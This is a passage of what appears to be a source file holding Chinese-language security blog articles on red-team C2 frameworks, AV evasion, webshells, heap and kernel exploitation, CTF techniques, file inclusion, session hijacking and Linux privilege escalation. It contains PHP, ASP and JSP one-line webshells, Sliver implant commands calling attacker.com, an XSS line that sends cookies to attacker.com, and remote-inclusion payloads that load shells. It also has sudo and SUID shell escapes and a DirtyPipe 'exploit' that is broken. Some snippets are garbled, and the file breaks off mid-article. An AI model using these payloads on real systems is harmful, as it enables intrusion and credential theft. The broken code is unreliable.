## CI/CD 集成

### GitHub Actions

\`\`\`yaml
- name: Run SAST
  uses: github/codeql-action/analyze@v2

- name: Run Snyk
  uses: snyk/actions@master
  env:
    SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
\`\`\`
    `
  },
  {
    slug: 'sast-dast',
    title: 'SAST 与 DAST 工具指南',
    date: '2026-06-10',
    category: 'securedev',
    subcategory: 'sast-dast',
    tags: ['安全测试', 'SAST', 'DAST'],
    summary: '静态和动态安全测试工具使用指南。',
    content: `
## SAST（静态应用安全测试）

### 特点
- 分析源代码
- 不需要运行程序
- 可以发现代码级漏洞
- 覆盖率高

### 工具

#### SonarQube

\`\`\`bash
# 扫描
sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=. -Dsonar.host.url=http://localhost:9000
\`\`\`

#### Semgrep

\`\`\`bash
# 基本使用
semgrep --config=auto .

# 指定规则
semgrep --config=p/owasp-top-ten .
\`\`\`

#### Bandit（Python）

\`\`\`bash
bandit -r .
\`\`\`

### 常见发现

- SQL 注入
- XSS
- 命令注入
- 硬编码密码
- 不安全的随机数

## DAST（动态应用安全测试）

### 特点
- 测试运行中的应用
- 模拟攻击者视角
- 发现运行时漏洞
- 无需源代码

### 工具

#### OWASP ZAP

\`\`\`bash
# 扫描
zap-baseline.py -t http://target.com

# 主动扫描
zap-full-scan.py -t http://target.com
\`\`\`

#### Nuclei

\`\`\`bash
nuclei -u http://target.com -t cves/
\`\`\`

### 常见发现

- SQL 注入
- XSS
- CSRF
- 信息泄露
- 配置错误

## SAST vs DAST

| 特性 | SAST | DAST |
|------|------|------|
| 分析对象 | 源代码 | 运行应用 |
| 阶段 | 开发早期 | 测试/生产 |
| 覆盖率 | 高 | 低 |
| 误报率 | 较高 | 较低 |
    `
  },
  // 红队技术
  {
    slug: 'c2-frameworks',
    title: 'C2 框架深度对比',
    date: '2026-06-20',
    category: 'redteam',
    subcategory: 'c2-framework',
    tags: ['红队', 'C2', '框架'],
    summary: '主流 C2 框架对比和实战配置。',
    content: `
## 什么是 C2

C2（Command and Control）命令与控制框架，用于红队渗透测试中管理被控主机。

## 主流框架对比

| 框架 | 特点 | 适用场景 |
|------|------|----------|
| CobaltStrike | 商业，功能全面 | 企业红队 |
| Sliver | 开源，Go编写 | 技术研究 |
| Havoc | 开源，现代化 | 技术研究 |
| Mythic | 开源，模块化 | 技术研究 |
| Brute Ratel | 商业，免杀强 | 高级红队 |

## Sliver 基础

### 安装

\`\`\`bash
# 安装
go install github.com/BishopFox/sliver/client@latest

# 或使用预编译版本
\`\`\`

### 生成 Payload

\`\`\`bash
# HTTP
sliver> generate --mtls attacker.com --os windows --arch amd64 --save ./beacon.exe

# DNS
sliver> generate --dns domain.com --os linux --save ./beacon

# 会话生成
sliver> generate --mtls attacker.com --save ./implant --session-lifetime 24h
\`\`\`

### 会话管理

\`\`\`bash
sliver> sessions              # 查看会话
sliver> use <session_id>      # 切换会话
sliver> background            # 后台运行
\`\`\`

### 常用命令

\`\`\`bash
sliver> info                  # 系统信息
sliver> ls                    # 列出文件
sliver> cd                    # 切换目录
sliver> upload / download     # 传输文件
sliver> shell                 # 交互Shell
sliver> execute               # 执行文件
sliver> screenshots           # 截屏
sliver> keylog                # 键盘记录
\`\`\`

## 通信协议

### MTLS（双向TLS）
最安全，需要证书。

### HTTP(S)
隐蔽性好，不易被检测。

### DNS
适合严格防火墙环境。

### WireGuard
VPN隧道，稳定。

## 流量混淆

\`\`\`bash
# Sliver 自定义混淆
sliver> generate --mtls attacker.com --混淆 --保存

# 使用 CDN
sliver> generate --cdn cloudfront.net --save ./beacon.exe
\`\`\`

## 防检测

1. 使用自定义Profile
2. 流量加密
3. 通信混淆
4. 域前置（Domain Fronting）
5. 多级跳板
    `
  },
  {
    slug: 'evasion-techniques',
    title: '免杀技术详解',
    date: '2026-06-18',
    category: 'redteam',
    subcategory: 'evasion',
    tags: ['红队', '免杀', '对抗'],
    summary: '绕过杀软检测的技术方法。',
    content: `
## 什么是免杀

免杀（AV Evasion）是绕过杀毒软件检测的技术。

## 检测方式

### 静态检测
- 特征码匹配
- 文件哈希
- PE 结构分析

### 动态检测
- 行为监控
- 沙箱检测
- 内存扫描

## 免杀方法

### 1. 加壳

\`\`\`bash
# UPX
upx -9 payload.exe

# Themida
# VMProtect
\`\`\`

### 2. 代码混淆

\`\`\`python
# 字符串加密
import base64
encoded = base64.b64encode("cmd.exe".encode())
\`\`\`

### 3. 多态/变形

\`\`\`
# 每次生成不同代码
# 相同功能，不同形态
\`\`\`

### 4. 内存加载

\`\`\`python
# 不写入磁盘
import ctypes
ctypes.windll.kernel32.VirtualAlloc(...)
ctypes.windll.kernel32.RtlMoveMemory(...)
\`\`\`

### 5. 反射DLL注入

\`\`\`python
# 从内存加载DLL
import ctypes
dll = ctypes.windll.kernel32.LoadLibrary("payload.dll")
\`\`\`

### 6. 进程注入

\`\`\`python
# 注入到合法进程
# Process Hollowing
# DLL Injection
\`\`\`

### 7. API 调用混淆

\`\`\`
# 使用非常规API
# 动态获取API地址
# 加密API字符串
\`\`\`

### 8. 供应链攻击

\`\`\`
# 污染合法软件
# 通过更新分发
\`\`\`

## 测试工具

\`\`\`bash
# VirusTotal 检测
vt scan file payload.exe

# 本地测试
# 多引擎检测网站
\`\`\`

## 对抗趋势

1. EDR 检测增强
2. 内存扫描普及
3. 行为分析增强
4. 云查杀普及
    `
  },
  {
    slug: 'social-engineering',
    title: '社会工程学攻击',
    date: '2026-06-15',
    category: 'redteam',
    subcategory: 'social-eng',
    tags: ['红队', '社会工程', '钓鱼'],
    summary: '社会工程学攻击技术和防御方法。',
    content: `
## 什么是社会工程学

利用人的心理弱点，通过欺骗手段获取敏感信息或执行操作。

## 攻击类型

### 1. 钓鱼攻击

#### 邮件钓鱼

\`\`\`
# 常见主题
- 账户验证
- 密码重置
- 发票通知
- HR通知

# 技术手段
- 仿冒域名
- 伪造发件人
- 恶意链接/附件
\`\`\`

#### 鱼叉式钓鱼

\`\`\`
# 针对特定目标
- 收集目标信息
- 定制化内容
- 高成功率
\`\`\`

### 2. 水坑攻击

\`\`\`
# 感染目标常访问的网站
# 等待目标访问
# 植入恶意代码
\`\`\`

### 3. 电话攻击

\`\`\`
# 冒充技术支持
- "您的账户有异常"
- "需要验证身份"
- "请提供密码"
\`\`\`

### 4. 物理攻击

\`\`\`
# 尾随进入
# 假冒身份
# USB投放
\`\`\`

## 信息收集

### OSINT

\`\`\`
# 社交媒体
- LinkedIn：职业信息
- Facebook：个人关系
- Twitter：兴趣爱好

# 公司信息
- 官网
- 新闻稿
- 招聘信息
\`\`\`

### 技术手段

\`\`\`
# 邮箱收集
theHarvester -d target.com -b google

# 密码泄露
Have I Been Pwned
\`\`\`

## 防御

1. 安全意识培训
2. 多因素认证
3. 邮件网关
4. 安全策略
5. 演练测试
    `
  },
  {
    slug: 'webshell-techniques',
    title: 'Webshell 高级技术',
    date: '2026-06-12',
    category: 'redteam',
    subcategory: 'webshell',
    tags: ['红队', 'Webshell', '后门'],
    summary: 'Webshell 加密、混淆和高级技术。',
    content: `
## 一句话木马

### PHP

\`\`\`php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php @eval($_POST['a']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
\`\`\`

### ASP

\`\`\`asp
<%eval request("cmd")%>
<% execute(request("cmd"))%>
\`\`\`

### JSP

\`\`\`jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
\`\`\`

## 加密 Webshell

### PHP Base64

\`\`\`php
<?php
$a = "base64编码的代码";
eval(base64_decode($a));
?>
\`\rypt\`

### PHP 异或

\`\`\`php
<?php
$a='!((%^$#...';  // 异或结果
eval($a);
?>
\`\`\`

## 免杀 Webshell

### 动态函数调用

\`\`\`php
<?php
\\$func = \\$_GET['func'];
\\$func(\\$_GET['cmd']);
?>
\`\`\`

### 回调函数

\`\`\`php
<?php
\\$callback = create_function('', \\$_POST['code']);
\\$callback();
?>
\`\`\`

## 大马

### 功能型

\`\`\`php
<?php
// 文件管理
// 数据库管理
// 命令执行
// 提权功能
\`\`\`

## Webshell 管理工具

### 中国蚁剑（AntSword）

\`\`\`
# 特点
- 跨平台
- 多语言支持
- 插件丰富
\`\`\`

### 哥斯拉（Godzilla）

\`\`\`
# 特点
- 加密通信
- 多种加密方式
- 内存马支持
\`\`\`

### 冰蝎（Behinder）

\`\`\`
# 特点
- AES加密
- 内存马
- 动态加载
\`\`\`

## 内存马

### 无文件 Webshell

\`\`\`java
# Servlet型
# Filter型
# Listener型
# Spring Controller型
\`\`\`

## 防御

1. WAF 检测
2. 文件完整性监控
3. 流量检测
4. 行为分析
5. 定期扫描
    `
  },
  // 漏洞分析
  {
    slug: 'cve-analysis',
    title: 'CVE 漏洞分析方法',
    date: '2026-06-17',
    category: 'vuln-analysis',
    subcategory: 'cve-analysis',
    tags: ['漏洞分析', 'CVE', '安全研究'],
    summary: 'CVE 漏洞分析和复现方法。',
    content: `
## 什么是 CVE

CVE（Common Vulnerabilities and Exposures）通用漏洞披露，用于标识漏洞的标准化系统。

## CVE 信息来源

- https://cve.mitre.org/
- https://nvd.nist.gov/
- https://漏洞平台

## 分析流程

### 1. 漏洞信息收集

\`\`\`
- CVE 编号
- 影响版本
- 漏洞描述
- PoC/EXP
- 修复方案
\`\`\`

### 2. 环境搭建

\`\`\`bash
# Docker 快速搭建
docker pull vulnerable-app:version
docker run -d -p 8080:80 vulnerable-app

# 靶场
Vulhub
VulApps
\`\`\`

### 3. 漏洞验证

\`\`\`bash
# 使用 PoC
python poc.py -t http://target:8080

# 手动验证
curl -X POST http://target/vuln -d "param=malicious"
\`\`\`

### 4. 漏洞分析

\`\`\`
# 阅读补丁
git diff old_version new_version

# 代码审计
# 反编译分析
# 调试跟踪
\`\`\`

### 5. EXP 开发

\`\`\`python
# 编写利用脚本
import requests

def exploit(target):
    payload = "malicious_code"
    r = requests.post(f"{target}/vuln", data={"param": payload})
    return r.text
\`\`\`

## 常见漏洞类型

| 类型 | 示例 |
|------|------|
| RCE | Log4j, Spring4Shell |
| 反序列化 | Fastjson, Shiro |
| 注入 | SQLi, LDAPi |
| SSRF | XXE, SSRF |
| 权限提升 | DirtyPipe |

## 漏洞复现环境

### Vulhub

\`\`\`bash
git clone https://github.com/vulhub/vulhub
cd vulhub/log4j/CVE-2021-44228
docker-compose up -d
\`\`\`
    `
  },
  {
    slug: 'heap-overflow',
    title: '堆溢出利用技术',
    date: '2026-06-14',
    category: 'vuln-analysis',
    subcategory: 'heap-overflow',
    tags: ['漏洞利用', '堆溢出', 'PWN'],
    summary: '堆溢出漏洞原理和利用方法。',
    content: `
## 堆的基本概念

### 堆管理

\`\`\`
┌─────────────────┐
│ chunk header    │ ← size + flags
├─────────────────┤
│ user data       │
├─────────────────┤
│ prev_size       │
├─────────────────┤
│ chunk header    │
└─────────────────┘
\`\`\`

### 堆分配

\`\`\`
malloc(size)  → 分配堆块
free(ptr)     → 释放堆块
\`\`\`

## 常见漏洞

### 1. Use-After-Free（UAF）

\`\`\`c
char *ptr = malloc(32);
free(ptr);
// ptr 未置空
ptr[0] = 'A';  // 使用已释放内存
\`\`\`

### 2. Double Free

\`\`\`c
char *ptr = malloc(32);
free(ptr);
free(ptr);  // 重复释放
\`\`\`

### 3. Off-By-One

\`\`\`c
char buf[32];
gets(buf);  // 溢出一个字节
\`\`\`

### 4. House of系列

- **House of Force**：利用 top chunk
- **House of Spirit**：伪造空闲块
- **House of Lore**：利用 smallbin
- **House of Orange**：利用 top chunk

## GDB 调试

\`\`\`bash
# 堆块信息
pheap 10

# 查看所有堆块
find 0xdeadbeef

# watch 点
watch *(int*)0x12345678
\`\`\`

## 防御

1. Canary 保护
2. ASLR
3. PIE
4. 堆保护机制
    `
  },
  {
    slug: 'rop-technique',
    title: 'ROP 返回导向编程',
    date: '2026-06-11',
    category: 'vuln-analysis',
    subcategory: 'rop',
    tags: ['漏洞利用', 'ROP', 'PWN'],
    summary: 'ROP 技术原理和利用方法。',
    content: `
## 什么是 ROP

ROP（Return-Oriented Programming）返回导向编程，利用已有代码片段（gadget）构造攻击链。

## 基本原理

\`\`\`
┌─────────────────┐
│ gadget1         │ → pop rdi; ret
├─────────────────┤
│ gadget2         │ → mov rax, 1; ret
├─────────────────┤
│ ...             │
└─────────────────┘
\`\`\`

## Gadget 查找

### ROPgadget

\`\`\`bash
# 查找所有gadget
ROPgadget --binary target --ropchain

# 查找特定gadget
ROPgadget --binary target | grep "pop rdi"
\`\`\`

### ropper

\`\`\`bash
ropper --file target --search "pop rdi"
\`\`\`

## ROP 构造

### ret2libc

\`\`\`python
from pwn import *

# 获取 libc 地址
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

# 构造 ROP
rop = ROP(libc)
rop.call(system, [bin_sh])
\`\`\`

### 通用 gadget

\`\`\`python
# 搜索通用 gadget
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x40101a      # ret

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
\`\`\`

## 防御

1. ROP 保护
2. 控制流完整性（CFI）
3. CET（Intel Control-flow Enforcement Technology）
    `
  },
  {
    slug: 'kernel-exploit',
    title: '内核漏洞利用',
    date: '2026-06-08',
    category: 'vuln-analysis',
    subcategory: 'kernel-exploit',
    tags: ['漏洞利用', '内核', '提权'],
    summary: 'Linux 内核漏洞利用技术。',
    content: `
## 内核漏洞类型

### 1. 本地提权

\`\`\`
# DirtyCow (CVE-2016-5195)
# DirtyPipe (CVE-2022-0847)
# 经典竞态条件
\`\`\`

### 2. 内核 RCE

\`\`\`
# 内核模块漏洞
# 网络协议栈漏洞
\`\`\`

## DirtyPipe (CVE-2022-0847)

### 影响版本

\`\`\`
Linux 5.8+
\`\`\`

### 漏洞原理

\`\`\`c
// 竞态条件导致覆写页面缓存
pipe_write() 与 splice() 竞争
\`\`\`

### 利用代码

\`\`\`c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int p[2];
    pipe(p);
    
    // 覆写 /etc/passwd
    const char *payload = "root2::0:0::/root:/bin/sh\\n";
    write(p[1], payload, strlen(payload));
    
    splice(p[0], NULL, fd, NULL, 1, 0);
    return 0;
}
\`\`\`

## 内核调试

### QEMU + GDB

\`\`\`bash
# 启动内核
qemu-system-x86_64 -kernel bz-append -initrd initramfs.cpio.gz -s -S

# GDB 连接
gdb vmlinux
target remote :1234
\`\`\`

### 常用调试命令

\`\`\`bash
# 查看进程信息
p current

# 查看 task_struct
p *(struct task_struct *)current

# 查看 cred
p current->cred
\`\`\`

## 内核保护

| 保护 | 说明 |
|------|------|
| SMEP | 禁止内核执行用户空间代码 |
| SMAP | 禁止内核访问用户空间数据 |
| KASLR | 内核地址空间随机化 |
| KPTI | 内核页表隔离 |

## 防御

1. 及时更新内核
2. 启用保护机制
3. 限制内核模块加载
4. 使用 grsecurity/PaX
    `
  },
  // CTF 竞赛
  {
    slug: 'ctf-web',
    title: 'CTF Web 方向指南',
    date: '2026-06-16',
    category: 'ctf',
    subcategory: 'ctf-web',
    tags: ['CTF', 'Web', '竞赛'],
    summary: 'CTF Web 方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. SQL 注入

\`\`\`sql
# 无过滤
' union select 1,2,3-- -

# 绕过过滤
/**/替代空格
大小写混合
\`\`\`

### 2. XSS

\`\`\`html
# 反射型
<script>alert(1)</script>

# 存储型
评论区注入

# DOM型
URL参数注入
\`\`\`

### 3. 文件上传

\`\`\`
# 绕过限制
.php5, .phtml
大小写：.PhP
图片马
\`\`\`

### 4. 反序列化

\`\`\`php
# PHP
O:4:"User":1:{s:4:"name";s:5:"admin";}

# Python
__import__('os').popen('whoami').read()
\`\`\`

### 5. 命令注入

\`\`\`bash
# 管道符
; |
|| &&

# 空格绕过
\\$IFS
{cmd,arg}
\`\`\`

### 6. SSTI

\`\`\`jinja2
# Jinja2
{{7*7}}  → 49
{{config}}

# Tplmap 工具
tplmap -u http://target/?param=1
\`\`\`

### 7. SSRF

\`\`\`
# 协议利用
file:///etc/passwd
gopher://127.0.0.1:6379/
\`\`\`

## 常用工具

- Burp Suite
- sqlmap
- dirsearch
- xssstrike
- tplmap

## 解题思路

1. 信息收集
2. 漏洞识别
3. 漏洞利用
4. 获取 flag
    `
  },
  {
    slug: 'ctf-pwn',
    title: 'CTF PWN 方向指南',
    date: '2026-06-13',
    category: 'ctf',
    subcategory: 'ctf-pwn',
    tags: ['CTF', 'PWN', '二进制'],
    summary: 'CTF PWN 方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. 栈溢出

\`\`\`python
from pwn import *

# 覆盖返回地址
payload = b'A' * offset
payload += p64(shellcode_addr)
\`\`\`

### 2. 格式化字符串

\`\`\`python
# 读取栈数据
payload = '%x.%x.%x.%x'

# 写入数据
payload = p64(target_addr) + '%100n'
\`\`\`

### 3. 堆利用

\`\`\`
# UAF
# Double Free
# House of系列
\`\`\`

### 4. ROP

\`\`\`python
rop = ROP ELF
rop.call('system', [next(elf.search(b'/bin/sh'))])
\`\`\`

## 工具

### Pwntools

\`\`\`python
from pwn import *

p = remote('ctf.target.com', 1337)
# 或
p = process('./binary')

# 发送payload
p.sendline(payload)

# 接收
print(p.recvline())
\`\`\`

### ROPgadget

\`\`\`bash
ROPgadget --binary target --ropchain
\`\`\`

### GDB 插件

\`\`\`bash
# pwndbg
pwndbg> heap
pwndbg> vis_heap_chunks
\`\`\`

## 解题步骤

1. 文件分析（file, checksec）
2. 反编译分析
3. 找到漏洞点
4. 构造 payload
5. 编写 exploit
    `
  },
  {
    slug: 'ctf-re',
    title: 'CTF 逆向方向指南',
    date: '2026-06-10',
    category: 'ctf',
    subcategory: 'ctf-re',
    tags: ['CTF', '逆向', '竞赛'],
    summary: 'CTF 逆向方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. 简单逆向

\`\`\`
# IDA 反编译
# 分析逻辑
# 编写解密脚本
\`\`\`

### 2. 反调试绕过

\`\`\`c
# ptrace 检测
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
    exit(1);
}

# 时间检测
start = time();
// 代码
end = time();
if (end - start > 1) {
    exit(1);
}
\`\`\`

### 3. 算法还原

\`\`\`
# TEA/XTEA
# RC4
# AES/DES
# 自定义算法
\`\`\`

### 4. 虚拟机

\`\`\`
# 自定义VM
# 分析指令集
# 编写反汇编器
\`\`\`

## 工具

### IDA Pro

\`\`\`
# 快捷键
F5: 反编译
X: 交叉引用
N: 重命名
\`\`\`

### Ghidra

\`\`\`
# 免费替代
# 内置反编译器
\`\`\`

### angr

\`\`\`python
# 符号执行
import angr

p = angr.Project('./binary')
state = p.factory.entry_state()
simgr = p.factory.simgr(state)

# 找到目标地址
simgr.explore(find=0x401234, avoid=0x401256)
\`\`\`

## 解题步骤

1. file 查看文件类型
2. IDA/Ghidra 反编译
3. 分析关键函数
4. 编写解密脚本
    `
  },
  {
    slug: 'ctf-crypto',
    title: 'CTF 密码学方向指南',
    date: '2026-06-07',
    category: 'ctf',
    subcategory: 'ctf-crypto',
    tags: ['CTF', '密码学', '竞赛'],
    summary: 'CTF 密码学方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. 经典密码

\`\`\`
# 凯撒密码
def caesar_decode(text, shift):
    return ''.join(chr((ord(c) - ord('a') - shift) % 26 + ord('a')) for c in text)

# ROT13
text.encode().decode('rot_13')
\`\`\`

### 2. Base64 变种

\`\`\`
# 自定义字符表
# 修改 padding
\`\`\`

### 3. RSA

\`\`\`python
# 小公钥指数
# 共模攻击
# 因数分解
\`\`\`

### 4. AES/DES

\`\`\`python
# ECB 模式攻击
# Padding Oracle
# 已知明文攻击
\`\`\`

### 5. 哈希长度扩展

\`\`\`python
# HashPump 工具
hashpump -s original_sig -d original_data -a append_data -k key_length
\`\`\`

## 工具

### SageMath

\`\`\`python
# 数学计算
from sage.all import *

# 因数分解
factor(n)
\`\`\`

### CyberChef

\`\`\`
# 在线工具
# 编码解码
# 加密解密
\`\`\`

### yafu

\`\`\`bash
# 大数因数分解
yafu "factor(n)"
\`\`\`

## 解题步骤

1. 识别加密方式
2. 分析弱点
3. 编写攻击脚本
4. 解密获取 flag
    `
  },
  // Web安全 - 补充
  {
    slug: 'lfi-rfi',
    title: '文件包含漏洞（LFI/RFI）',
    date: '2026-06-19',
    category: 'websec',
    subcategory: 'lfi',
    tags: ['Web安全', '文件包含', 'LFI', 'RFI'],
    summary: '本地文件包含和远程文件包含漏洞原理与利用。',
    content: `
## 什么是文件包含

文件包含是应用程序将用户可控的文件名包含到代码中执行，导致恶意文件被加载执行。

## LFI（本地文件包含）

### 基础利用

\`\`\`
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00    # 空字节截断（PHP<5.3.4）
\`\`\`

### 常见路径

\`\`\`
# Linux
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/fd/[0-10]
/var/log/apache2/access.log
/var/log/nginx/access.log

# Windows
C:\\Windows\\win.ini
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\Windows\\repair\\sam
\`\`\`

### 读取日志实现RCE

\`\`\`
# 1. User-Agent 注入 PHP 代码
curl -A "<?php system($_GET['cmd']); ?>" http://target/?page=/var/log/apache2/access.log

# 2. 包含日志执行命令
?file=/var/log/apache2/access.log&cmd=whoami
\`\`\`

### PHP 伪协议

\`\`\`
# 读取源码
?page=php://filter/read=convert.base64-encode/resource=index.php

# 写入文件
?page=php://input
POST: <?php system('id'); ?>

# data 协议
?page=data://text/plain,<?php system('id'); ?>
\`\`\`

## RFI（远程文件包含）

\`\`\`
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
\`\`\`

### allow_url_include 开启时

\`\`\`
?page=php://input
POST: <?php include 'http://attacker.com/shell.php'; ?>
\`\`\`

## 竞争条件包含

\`\`\`
# 上传文件的同时包含
# 利用时间窗口执行恶意代码
\`\`\`

## 防御方案

1. 禁止用户控制文件包含路径
2. 设置 allow_url_include = Off
3. 使用白名单限制可包含文件
4. 关闭危险 PHP 伪协议
    `
  },
  {
    slug: 'session-hijack',
    title: '会话劫持与会话固定',
    date: '2026-06-18',
    category: 'websec',
    subcategory: 'session-hijack',
    tags: ['Web安全', '会话劫持', '会话固定', 'Cookie'],
    summary: '会话劫持和会话固定漏洞原理与防御。',
    content: `
## 会话机制

### Session 工作流程

\`\`\`
1. 用户登录 → 服务端创建 Session
2. 返回 SessionID 给浏览器（Cookie）
3. 浏览器携带 SessionID 发起请求
4. 服务端验证 SessionID
\`\`\`

## 会话劫持

### 窃取 SessionID

\`\`\`
# XSS 窃取 Cookie
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# 网络嗅探（HTTP明文）
# 使用 Wireshark 抓取 Cookie

# 中间人攻击
# SSL 剥离
\`\`\`

### Session 固定

\`\`\`
# 攻击流程
1. 攻击者获取一个合法 SessionID
2. 诱导受害者使用该 SessionID 登录
3. 受害者登录后，攻击者使用相同 SessionID 访问

# 示例
https://target.com/login?session=abc123
\`\`\`

### 窃取本地 Session 文件

\`\`\`
# PHP Session 存储位置
/var/lib/php/sessions/sess_xxxxx

# 文件包含读取
?page=/var/lib/php/sessions/sess_abc123
\`\`\`

## 防御方案

1. **HttpOnly Cookie**：防止 JavaScript 读取
2. **Secure Flag**：仅 HTTPS 传输
3. **Session 轮换**：登录后重新生成 SessionID
4. **会话超时**：设置合理的过期时间
5. **IP 绑定**：Session 与 IP 绑定
6. **SameSite 属性**：限制跨站请求
    `
  },
  // 攻防对抗 - 补充
  {
    slug: 'linux-privesc',
    title: 'Linux 权限提升',
    date: '2026-06-16',
    category: 'attack-defense',
    subcategory: 'privesc',
    tags: ['渗透测试', '权限提升', 'Linux'],
    summary: 'Linux 环境下的常见提权方法和工具。',
    content: `
## 提权方法

### 1. SUID 提权

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 常见可提权SUID
/usr/bin/find -exec /bin/sh \\;
/usr/bin/vim -c ':!sh'
/usr/bin/nmap --interactive
\`\`\`

### 2. 内核漏洞

\`\`\`bash
# 查看内核版本
uname -r

# 搜索可利用漏洞
searchsploit linux kernel 4.x
\`\`\`

### 3. 计划任务

\`\`\`bash
# 查看可写的计划任务脚本
cat /etc/crontab
ls -la /etc/cron.*
\`\`\`

### 4. 密码相关

\`\`\`bash
# 查找敏感文件
find / -name "*.conf" -o -name "*.cfg" 2>/dev/null
cat /etc/shadow
\`\`\`

### 5. sudo 提权

\`\`\`bash
# 查看sudo权限
sudo -l

# 常见提权
sudo vim -c ':!sh'
sudo find / -exec /bin/sh \\;
\`\`\`

### 6. Capabilities

\`\`\`bash
# 查找capabilities
getcap -r / 2>/dev/null

# 利用
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
\`\`\`

## 工具

- **LinPEAS**：自动化提权检查
- **linux-exploit-suggester**：漏洞搜索
- **GTFOBins**：SUID/sudo 提权参考

## 防御

1. 及时更新内核
2. 定期检查 SUID 文件
3. 最小权限原则
4. 监控异常进程
    `
  },
  // 工具手册 - 补充 fscan
  {
    slug: 'fscan-guide',
    title: 'Fscan 内网扫描工具',
    date: '2026-06-14',
    category: 'tools',
    subcategory: 'fscan',
    tags: ['工具', 'Fscan', '内网扫描'],
    summary: 'Fscan 快速内网扫描和漏洞检测工具。',
    content: `
## Fscan 简介

Fscan 是一款快速内网扫描工具，支持端口探测、服务识别、漏洞检测。

## 基本用法

\`\`\`bash
# 快速扫描
fscan -h 192.168.1.0/24

# 指定端口
fscan -h 192.168.1.0/24 -p 80,443,445,3389,6379,27017

# 全端口扫描
fscan -h 192.168.1.0/24 -p 1-65535
\`\`\`

## 常用参数

| 参数 | 说明 |
|------|------|
| -h | 目标IP/CIDR |
| -p | 指定端口 |
| -o | 输出文件 |
| -t | 线程数 |
| -np | 不进行Ping探测 |
| -c | 指定命令执行 |
| -m | 扫描模式 |

## 功能

### 端口扫描
\`\`\`bash
fscan -h 192.168.1.100 -p 80,443,445
\`\`\`

### 服务识别
自动识别 HTTP、SMB、SSH、RDP 等服务。

### 漏洞检测
\`\`\`bash
# 检测常见漏洞
fscan -h 192.168.1.0/24 -np -p 445

# 检测 Weblogic
fscan -h 192.168.1.0/24 -p 7001

# 检测 Redis
fscan -h 192.168.1.0/24 -p 6379
\`\`\`

### 域探测
\`\`\`bash
fscan -h 192.168.1.0/24 -dc 192.168.1.1
\`\`\`

## 实战技巧

\`\`\`bash
# 第一轮：快速存活探测
fscan -h 10.10.0.0/16 -np -p 80,443,445,3389,6379,27017,1433,3306 -o alive.txt

# 第二轮：详细扫描
fscan -h 10.10.1.0/24 -p 1-65535 -o full.txt

# 第三轮：漏洞利用
fscan -h 10.10.1.100 -p 445 -c "whoami"
\`\`\`

## 防御

1. 限制内网访问
2. 修改默认端口
3. 强密码策略
4. 防火墙规则
    `
  },
  // 移动端安全 - 补充 APP渗透详细
  {
    slug: 'android-pentest-advanced',
    title: 'APP 渗透测试实战',
    date: '2026-06-12',
    category: 'mobile',
    subcategory: 'android-pentest',
    tags: ['移动端安全', 'APP渗透', 'Frida'],
    summary: 'APP 渗透测试完整流程：抓包、反编译、加固绕过。',
    content: `
## APK 敏感信息收集

### apkleaks 快速扫描

\`\`\`bash
# 安装
pip install apkleaks

# 扫描APK
python apkleaks.py -f target.apk
# 可发现云主机key、服务器IP、API密钥等
\`\`\`

### 反编译分析

\`\`\`bash
# jadx 反编译
jadx -d output/ target.apk

# 检查 classes.dex 硬编码
# 检查 SharedPreferences 配置
# 检查 SQLite 数据库
\`\`\`

## APP 抓包

### 代理设置

\`\`\`
1. BurpSuite 监听 127.0.0.1:8080
2. 模拟器设置桥接模式
3. 配置网络代理为 Burp 地址
\`\`\`

### 安装系统证书

\`\`\`bash
# 转为 PEM 格式
openssl x509 -inform DER -in cacert.der -out cacert.pem

# 重命名为 hash 值
mv cacert.pem \`openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1\`.0'

# 复制到系统证书目录
\`\`\`

## 加固绕过

### Root 检测绕过

\`\`\`bash
# 使用 Magisk + Shamiko
adb push Shamiko.zip /sdcard/Download/
# 面具 → 模块 → 本地安装 → 刷入 → 重启
# 面具设置 → 排除列表 → 添加目标 APP
\`\`\`

### 代理检测绕过

\`\`\`bash
# 使用 VPN 代理
# https://github.com/ys1231/appproxy
\`\`\`

### SSL Pinning 绕过

\`\`\`bash
# 1. 查找设备架构
adb shell getprop ro.product.cpu.abi

# 2. 推送 frida-server
adb push frida-server /data/local/tmp/
adb shell chmod 777 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# 3. 列出进程
frida-ps -U

# 4. 注入脚本
frida -U -f com.package.name --no-pause -l bypass.js
\`\`\`

### Frida 绕过脚本

\`\`\`javascript
// SSL Pinning Bypass
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: "com.bypass.TrustManager",
        implements: [Java.use("javax.net.ssl.X509TrustManager")],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
});
\`\`\`

## 安全测试清单

1. 敏感信息收集
2. 抓包分析接口
3. 测试未授权访问
4. 测试参数篡改
5. 检查数据存储
6. 测试 SSL Pinning
    `
  },
  // 移动端安全 - 增强小程序
  {
    slug: 'miniapp-pentest-advanced',
    title: '小程序渗透测试实战',
    date: '2026-06-10',
    category: 'mobile',
    subcategory: 'miniapp-pentest',
    tags: ['移动端安全', '小程序渗透', '微信'],
    summary: '微信小程序渗透测试完整流程。',
    content: `
## PC 端小程序抓包

### Proxifier + BurpSuite

\`\`\`
